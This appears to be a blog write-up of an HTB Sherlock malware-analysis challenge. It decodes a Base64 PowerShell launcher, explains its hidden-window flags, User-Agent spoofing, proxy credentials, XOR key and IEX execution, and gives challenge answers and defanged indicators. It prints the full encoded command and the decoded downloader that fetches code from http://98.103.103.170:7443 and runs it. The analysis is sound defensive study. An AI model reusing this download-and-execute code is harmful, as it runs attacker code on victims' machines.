@@ -1,0 +1,161 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>PowerShell_Script — HTB Sherlock Write-up | Sacit Çınar</title><meta name="description" content="An HTB Sherlock walkthrough: decode a Base64 PowerShell downloader with CyberChef and analyze its proxy settings, XOR key and payload execution."><meta name="theme-color" content="#0c0d10"><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="/about.css"><link rel="stylesheet" href="/projects.css"><link rel="stylesheet" href="/research.css"><link rel="stylesheet" href="/theme.css"><link rel="canonical" href="https://sacitcinar.github.io/write-ups/powershell-script/"><link rel="icon" href="/assets/brand/circuit-shield.svg" type="image/svg+xml"><link rel="icon" href="/favicon-32.png" sizes="32x32" type="image/png"><link rel="shortcut icon" href="/favicon.ico"></head><body data-section-page="writeups"><header class="site-header"><div class="header-inner"><a class="brand" data-section="home" href="/index.html" aria-label="Sacit Çınar — Home"><span class="brand-mark" aria-hidden="true"><img src="/assets/brand/circuit-shield.svg" width="34" height="36" alt="" aria-hidden="true"></span><span class="brand-copy"><span class="brand-name">Sacit Çınar</span><span class="brand-prompt">dominic@kali:~$<span class="terminal-cursor" aria-hidden="true"></span></span></span></a><nav aria-label="Main navigation"><a href="/index.html" data-section="home">Home</a><a href="/research.html" data-section="research">Research</a><a href="/projects.html" data-section="projects">Projects</a><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page">Write-ups</a><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a></nav></div></header><main class="projects-main research-detail writeup-detail"><a class="project-return" data-section="writeups" href="/write-ups.html">← All write-ups</a><section class="research-hero"><div class="project-meta"><span class="project-badge badge-htb">HTB</span><span class="project-badge">SHERLOCK</span><span class="project-badge">MALWARE ANALYSIS</span></div><h1>PowerShell_Script</h1><p class="research-deck">A suspicious PowerShell script, decoded and explained.</p><p class="research-byline">By Mehmet Sacit Çınar · <time datetime="2026-10-16">16 October 2026</time></p></section><div class="research-layout"><aside class="article-toc"><p>IN THIS WRITE-UP</p><nav aria-label="Table of contents"><a href="#overview">Overview</a><a href="#1-inspecting-the-command">1. Inspecting the Command</a><a href="#2-decoding-with-cyberchef">2. Decoding with CyberChef</a><a href="#3-examining-network-access">3. Examining Network Access</a><a href="#4-unpacking-and-executing-the-next-stage">4. Unpacking and Executing the Next Stage</a><a href="#5-findings-and-indicators">5. Findings and Indicators</a></nav></aside><article class="research-copy writeup-copy"><h2 id="overview">Overview</h2>
+<p>This challenge provides a suspicious PowerShell script containing a Base64-encoded command. The goal is to decode the command and identify how it communicates with a remote server and prepares downloaded code for execution.</p>
+<p>The supplied scenario identifies the artifact as <code>C:\Users\LetsDefend\Desktop\ChallengeFile\script.ps1</code>. This walkthrough examines the command as text. The script was not executed, and the remote payload was not retrieved.</p>
+<h2 id="1-inspecting-the-command">1. Inspecting the Command</h2>
+<p>The launcher begins with:</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-1"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-1"><code class="language-powershell">powershell.exe -NoP -sta -NonI -W Hidden -Enc &lt;Base64 data&gt;
+</code></pre></div>
+<details class="encoded-command"><summary>Base64</summary><pre id="writeup-code-2" class="base64-text"><code>JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMAbABpAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAG8AeABZACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAFUARQBzAHQAXQA6ADoARABFAEYAQQB1AEwAdABXAGUAYgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBPAHgAWQAuAEMAcgBFAGQAZQBuAFQAaQBhAGwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQB0AFcATwByAEsAQwByAGUAZABFAE4AVABpAEEAbABzADsAJABLAD0AJwBJAE0ALQBTACYAZgBBADkAWAB1AHsAWwApAHwAdwBkAFcASgBoAEMAKwAhAE4AfgB2AHEAXwAxADIATAB0AHkAJwA7ACQAaQA9ADAAOwBbAEMASABhAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AE4ATABPAGEARABTAHQAcgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwA5ADgALgAxADAAMwAuADEAMAAzAC4AMQA3ADAAOgA3ADQANAAzAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgAbwBSACQASwBbACQASQArACsAJQAkAGsALgBMAEUAbgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA=</code></pre><button class="copy-code base64-copy" type="button" aria-label="Copy Base64 to clipboard" aria-controls="writeup-code-2"><span data-copy-label>Copy</span></button></details>
+<p>These arguments control how PowerShell starts:</p>
+<div class="report-table-wrap"><table class="report-table">
+<thead>
+<tr>
+<th>Argument</th>
+<th>Full name</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-NoP</code></td>
+<td><code>-NoProfile</code></td>
+<td>Skips loading PowerShell profile scripts.</td>
+</tr>
+<tr>
+<td><code>-sta</code></td>
+<td><code>-STA</code></td>
+<td>Uses the Single-Threaded Apartment model.</td>
+</tr>
+<tr>
+<td><code>-NonI</code></td>
+<td><code>-NonInteractive</code></td>
+<td>Disables interactive input; operations requiring user interaction fail.</td>
+</tr>
+<tr>
+<td><code>-W Hidden</code></td>
+<td><code>-WindowStyle Hidden</code></td>
+<td>Hides the PowerShell window.</td>
+</tr>
+<tr>
+<td><code>-Enc</code></td>
+<td><code>-EncodedCommand</code></td>
+<td>Accepts a Base64-encoded command represented as UTF-16LE text.</td>
+</tr>
+</tbody></table></div>
+<p>The encoded argument conceals the command&#39;s readable form. Base64 is an encoding, not encryption.</p>
+<h3 id="task-0-script-encoding"><span class="task-number">Task 0</span> — Script encoding</h3>
+<p><strong>Question:</strong> What encoding is the malicious script using?</p>
+<details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p><strong>Answer:</strong> <code>Base64</code></p></div></details>
+<h3 id="task-1-hidden-window"><span class="task-number">Task 1</span> — Hidden window</h3>
+<p><strong>Question:</strong> What parameter in the powershell script makes it so that the powershell window is hidden when executed?</p>
+<details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p><strong>Answer:</strong> <code>-W Hidden</code></p></div></details>
+<h3 id="task-2-non-interactive-execution"><span class="task-number">Task 2</span> — Non-interactive execution</h3>
+<p><strong>Question:</strong> What parameter in the PowerShell script prevents the user from closing the process?</p>
+<details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p><strong>Accepted answer:</strong> <code>-NonI</code></p></div></details>
+<p>The question&#39;s wording is misleading. <code>-NonI</code> makes the session non-interactive; it does <strong>not</strong> prevent a user from terminating the process. Hiding the window and disabling interaction are separate behaviors.</p>
+<h2 id="2-decoding-with-cyberchef">2. Decoding with CyberChef</h2>
+<p>To recover the command:</p>
+<ol>
+<li>Copy only the Base64 value after <code>-Enc</code> into CyberChef&#39;s <strong>Input</strong> panel.</li>
+<li>Add <strong>From Base64</strong> to the recipe.</li>
+<li>Add <strong>Decode text</strong> and select <strong>UTF-16LE (1200)</strong>.</li>
+</ol>
+<p>The output reveals the PowerShell code below. Capitalization and spacing have been normalized for readability; the logic is unchanged.</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-3"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-3"><code class="language-powershell">$WC = New-Object System.NET.WebClient
+$u = &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;
+$WC.Headers.Add(&#39;User-Agent&#39;, $u)
+
+$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
+$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
+$K = &#39;IM-S&amp;fA9Xu{[)|wdWJhC+!N~vq_12Lty&#39;
+$i = 0
+
+[char[]]$B = ([char[]](
+    $WC.DownloadString(&quot;http://98.103.103.170:7443/index.asp&quot;)
+)) | ForEach-Object {
+    $_ -bxor $K[$i++ % $K.Length]
+}
+
+IEX ($B -join &#39;&#39;)
+</code></pre></div>
+<h2 id="3-examining-network-access">3. Examining Network Access</h2>
+<h3 id="task-3-creating-the-web-client"><span class="task-number">Task 3</span> — Creating the web client</h3>
+<p><strong>Question:</strong> What line of code allows the script to interact with websites and retrieve information from them?</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-4"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-4"><code class="language-powershell">$WC = New-Object System.Net.WebClient
+</code></pre></div>
+<p>This creates the .NET <code>WebClient</code> object. The script later uses its <code>DownloadString</code> method to retrieve remote content as text.</p>
+<details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p><strong>Answer:</strong> <code>$WC=New-Object System.Net.WebClient</code></p></div></details>
+<h3 id="task-4-spoofing-the-user-agent"><span class="task-number">Task 4</span> — Spoofing the User-Agent</h3>
+<p><strong>Question:</strong> What is the user agent string that is being spoofed in the malicious script?</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-5"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-5"><code class="language-powershell">$u = &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;
+$WC.Headers.Add(&#39;User-Agent&#39;, $u)
+</code></pre></div>
+<p>The script adds a browser-style User-Agent header resembling Internet Explorer 11 on 64-bit Windows 7. This describes the identity presented in the request; it does not establish the actual operating system of the affected host.</p>
+<details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p><strong>Answer:</strong> <code>Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</code></p></div></details>
+<h3 id="task-5-proxy-authentication"><span class="task-number">Task 5</span> — Proxy authentication</h3>
+<p><strong>Question:</strong> What line of code is used to set the proxy credentials for authentication in the script?</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-6"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-6"><code class="language-powershell">$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
+$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+</code></pre></div>
+<p>The first statement selects the system&#39;s default web proxy. The second assigns the current security context&#39;s default network credentials for proxy authentication. It does not contain a hardcoded username or password.</p>
+<details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p><strong>Answer:</strong> <code>$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials</code></p></div></details>
+<h3 id="task-6-payload-download-url"><span class="task-number">Task 6</span> — Payload download URL</h3>
+<p><strong>Question:</strong> When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-7"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-7"><code class="language-powershell">$WC.DownloadString(&quot;http://98.103.103.170:7443/index.asp&quot;)
+</code></pre></div>
+<p>This statement requests the next stage from <code>98.103.103.170</code> on TCP port <code>7443</code>, using the path <code>/index.asp</code>. The scheme is plain <strong>HTTP</strong>, despite the port number.</p>
+<details class="answer-spoiler"><summary>Reveal answer</summary><div class="answer-content"><p><strong>Answer:</strong> <code>http://98.103.103.170:7443/index.asp</code></p></div></details>
+<h2 id="4-unpacking-and-executing-the-next-stage">4. Unpacking and Executing the Next Stage</h2>
+<p>The remaining statements show what the script is designed to do with the downloaded text.</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-8"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-8"><code class="language-powershell">$K = &#39;IM-S&amp;fA9Xu{[)|wdWJhC+!N~vq_12Lty&#39;
+$i = 0
+</code></pre></div>
+<p><code>$K</code> holds the XOR key, and <code>$i</code> tracks the position in that key.</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-9"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-9"><code class="language-powershell">$_ -bxor $K[$i++ % $K.Length]
+</code></pre></div>
+<p>Each downloaded character is XORed with the corresponding key character. The modulo operation wraps the index back to the start of the key, repeating it across the downloaded content. The resulting characters are stored in <code>$B</code>.</p>
+<div class="writeup-terminal"><div class="writeup-terminal-bar"><span class="writeup-terminal-title"><span class="terminal-glyph" aria-hidden="true">&gt;_</span>PowerShell</span><button class="copy-code" type="button" aria-label="Copy powershell to clipboard" aria-controls="writeup-code-10"><svg viewBox="0 0 20 20" width="15" height="15" fill="none" aria-hidden="true"><rect x="7" y="7" width="10" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M12 7V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h3" stroke="currentColor" stroke-width="1.4"/></svg><span data-copy-label>Copy</span></button></div><pre id="writeup-code-10"><code class="language-powershell">IEX ($B -join &#39;&#39;)
+</code></pre></div>
+<p><code>-join &#39;&#39;</code> combines those characters into a string. <code>IEX</code>, an alias for <code>Invoke-Expression</code>, evaluates that string as PowerShell code. The shown command does not explicitly save the downloaded stage to a file before evaluating it.</p>
+<p>Without the server response, the decoded next-stage content and its behavior cannot be determined from this launcher alone.</p>
+<h2 id="5-findings-and-indicators">5. Findings and Indicators</h2>
+<p>The visible execution flow is:</p>
+<ol>
+<li>Start PowerShell with a hidden window and a non-interactive session.</li>
+<li>Decode the Base64 command supplied through <code>-EncodedCommand</code>.</li>
+<li>Configure a WebClient with a browser-style User-Agent and default proxy credentials.</li>
+<li>Download text from the remote HTTP endpoint.</li>
+<li>Apply repeating-key XOR to the downloaded text.</li>
+<li>Evaluate the reconstructed string with <code>Invoke-Expression</code>.</li>
+</ol>
+<p>The following indicators were extracted from the supplied command. They describe the challenge artifact, not independently verified current threat infrastructure.</p>
+<div class="report-table-wrap"><table class="report-table">
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Remote IPv4 address</td>
+<td><code>98.103.103[.]170</code></td>
+</tr>
+<tr>
+<td>TCP port</td>
+<td><code>7443</code></td>
+</tr>
+<tr>
+<td>Payload URL, defanged</td>
+<td><code>hxxp://98.103.103[.]170:7443/index.asp</code></td>
+</tr>
+<tr>
+<td>Request path</td>
+<td><code>/index.asp</code></td>
+</tr>
+<tr>
+<td>XOR key</td>
+<td><code>IM-S&amp;fA9Xu{[)|wdWJhC+!N~vq_12Lty</code></td>
+</tr>
+</tbody></table></div>
+<p>The command supports identifying this script as a downloader that decodes and executes a subsequent PowerShell stage. It does not establish what that stage ultimately does, whether the download succeeded, or whether execution occurred on a real host.</p>
+</article></div></main><footer class="site-footer"><div class="footer-inner"><p>© 2026 Mehmet Sacit Çınar</p><nav class="footer-nav" aria-label="Footer navigation"><a href="/index.html" data-section="home">Home</a><a href="/research.html" data-section="research">Research</a><a href="/projects.html" data-section="projects">Projects</a><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page">Write-ups</a><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a></nav></div></footer><script src="/navigation.js" defer></script><script src="/writeup.js" defer></script></body></html>
